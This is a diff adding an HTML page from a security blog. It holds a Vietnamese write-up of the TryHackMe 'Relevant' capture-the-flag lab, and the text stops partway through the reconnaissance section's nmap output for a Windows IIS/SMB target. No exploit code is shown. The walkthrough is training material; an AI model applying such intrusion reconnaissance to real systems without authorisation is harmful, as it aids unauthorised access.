@@ -1,0 +1,1468 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>Tryhackme - Relevant &middot; Re-toor</title>
+    <meta name="title" content="Tryhackme - Relevant &middot; Re-toor">
+  
+
+  
+  
+  
+    <meta name="keywords" content="tryhackme,web,msfvenom,windows,smb,printspoofer,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/ctf/tryhackme/relevant/2021-11-26-thm-relevant/">
+  
+
+  
+  
+    <meta name="author" content="TAH">
+  
+  
+    
+      
+        
+          <link href="https://github.com/re-toor" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/ha-tuan-anh" rel="me">
+        
+      
+    
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/ctf/tryhackme/relevant/2021-11-26-thm-relevant/">
+  <meta property="og:site_name" content="Re-toor">
+  <meta property="og:title" content="Tryhackme - Relevant">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="ctf">
+    <meta property="article:published_time" content="2021-11-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-11-26T00:00:00+00:00">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Msfvenom">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Smb">
+    <meta property="article:tag" content="Printspoofer">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Tryhackme - Relevant">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+    <meta name="google-site-verification" content="1SrZKSHd82TJBbAQUQHiETfCL9gFqP0JneGjCV7VgHk">
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.dee52a50de99867dcf702b61813409684375e1531029925e3bf93a18ce5e9b90966dda9f19fd79daeca29df901c7b5408766f123540a0db92714d31fe7c3bdb1.css"
+    integrity="sha512-3uUqUN6Zhn3PcCthgTQJaEN14VMQKZJeO/k6GM5em5CWbdqfGf152uyinfkBx7VAh2bxI1QKDbknFNMf58O9sQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js"
+      integrity="sha512-vdp97ObLrwje730lT3&#43;ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Ctf",
+    "name": "Tryhackme - Relevant",
+    "headline": "Tryhackme - Relevant",
+    
+    "inLanguage": "en",
+    "url" : "http://localhost:1313/ctf/tryhackme/relevant/2021-11-26-thm-relevant/",
+    "author" : {
+      "@type": "Person",
+      "name": "TAH"
+    },
+    "copyrightYear": "2021",
+    "dateCreated": "2021-11-26T00:00:00\u002b00:00",
+    "datePublished": "2021-11-26T00:00:00\u002b00:00",
+    
+    "dateModified": "2021-11-26T00:00:00\u002b00:00",
+    
+    "keywords": ["tryhackme","web","msfvenom","windows","smb","printspoofer"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1351"
+  },
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [{
+            "@type": "ListItem",
+            "position":  1 ,
+            "name": "TryHackMe",
+            "item": "http://localhost:1313/ctf/tryhackme/"
+          },{
+            "@type": "ListItem",
+            "position":  2 ,
+            "name": "Ctf",
+            "item": "http://localhost:1313/ctf/"
+          },{
+        "@type": "ListItem",
+        "position":  3 ,
+        "name": "Tryhackme - Relevant",
+        "item": "http://localhost:1313/ctf/tryhackme/relevant/2021-11-26-thm-relevant/"
+      }
+    ]
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      Re-toor
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/blog/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Blog"
+      title="Blog">
+      
+      
+        <span class="text-base font-medium break-normal">
+          Blog
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/soc/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="SOC"
+      title="SOC">
+      
+      
+        <span class="text-base font-medium break-normal">
+          SOC
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <div class="nested-menu">
+      <div class="cursor-pointer flex items-center">
+        <a
+          
+            href="/ctf/"
+            
+          
+          aria-label="CTF"
+          class="flex items-center text-base font-medium bf-icon-color-hover"
+          title="Ctf">
+          
+          <span class="text-bg font-bg break-normal" title="Ctf">
+            CTF
+          </span>
+          <span>
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </span>
+        </a>
+      </div>
+      <div class="menuhide">
+        <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl bg-neutral/25 dark:bg-neutral-800/25">
+          <div class="flex flex-col space-y-3">
+            
+              <a
+                href="/ctf/hackthebox/"
+                
+                aria-label="HackTheBox"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="HackTheBox">
+                  HackTheBox
+                </span>
+              </a>
+            
+              <a
+                href="/ctf/tryhackme/"
+                
+                aria-label="TryHackMe"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="TryHackMe">
+                  TryHackMe
+                </span>
+              </a>
+            
+              <a
+                href="/ctf/selfdev/"
+                
+                aria-label="Self-dev"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="Self-dev">
+                  Self-dev
+                </span>
+              </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+  
+
+    
+      
+  
+    <a
+      href="/about/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="About"
+      title="About">
+      
+      
+        <span class="text-base font-medium break-normal">
+          About
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/blog/"
+        aria-label="Blog"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Blog" class="text-2xl font-bold tracking-tight">
+          Blog
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/soc/"
+        aria-label="SOC"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="SOC" class="text-2xl font-bold tracking-tight">
+          SOC
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/ctf/"
+        aria-label="CTF"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Ctf" class="text-2xl font-bold tracking-tight">
+          CTF
+        </span>
+        
+          <label
+            for="fullscreen-submenu-ctf"
+            class="ms-auto flex items-center justify-center h-10 w-10 cursor-pointer rounded-lg bf-icon-color-hover border bf-border-color bf-border-color-hover">
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </label>
+        
+      </a>
+
+      
+        <input checked type="checkbox" id="fullscreen-submenu-ctf" autocomplete="off" class="hidden peer/full">
+
+        <div
+          class="grid grid-rows-[0fr] transition-[grid-template-rows] duration-300 peer-checked/full:grid-rows-[1fr]">
+          <div class="overflow-hidden">
+            <div class="ms-7 mt-4">
+              
+                <a
+                  href="/ctf/hackthebox/"
+                  aria-label="HackTheBox"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="HackTheBox" class="text-lg">
+                    HackTheBox
+                  </span>
+                </a>
+              
+                <a
+                  href="/ctf/tryhackme/"
+                  aria-label="TryHackMe"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="TryHackMe" class="text-lg">
+                    TryHackMe
+                  </span>
+                </a>
+              
+                <a
+                  href="/ctf/selfdev/"
+                  aria-label="Self-dev"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="Self-dev" class="text-lg">
+                    Self-dev
+                  </span>
+                </a>
+              
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/about/"
+        aria-label="About"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="About" class="text-2xl font-bold tracking-tight">
+          About
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+
+
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Tryhackme - Relevant
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2021-11-26T00:00:00&#43;00:00">26 November 2021</time><span class="px-2 text-primary-500">&middot;</span><span>1351 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          <ol start="0">
+<li>this unordered seed list will be replaced by toc as unordered list
+{:toc}</li>
+</ol>
+<p>Hôm nay tôi sẽ giải CTF <a href="https://tryhackme.com/room/relevant"  target="_blank" rel="noreferrer">Tryhackme - Relevant</a></p>
+
+<h2 class="relative group">Reconnaissance
+    <div id="reconnaissance" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reconnaissance" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Vẫn như thông thường, việc đầu tiên cần làm là quét các cổng đang mở của ip mục tiêu.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">PORT</span>      <span class="nx">STATE</span> <span class="nx">SERVICE</span>       <span class="nx">REASON</span>  <span class="nx">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>    <span class="nx">open</span>  <span class="nx">http</span>          <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">Microsoft</span> <span class="nx">IIS</span> <span class="nx">httpd</span> <span class="mf">10.0</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="o">:</span> <span class="nx">Microsoft</span><span class="o">-</span><span class="nx">IIS</span><span class="o">/</span><span class="mf">10.0</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="o">:</span> <span class="nx">IIS</span> <span class="nx">Windows</span> <span class="nx">Server</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Supported</span> <span class="nx">Methods</span><span class="o">:</span> <span class="nx">OPTIONS</span> <span class="nx">TRACE</span> <span class="nx">GET</span> <span class="nx">HEAD</span> <span class="nx">POST</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">Potentially</span> <span class="nx">risky</span> <span class="nx">methods</span><span class="o">:</span> <span class="nx">TRACE</span>
+</span></span><span class="line"><span class="cl"><span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">msrpc</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>   <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
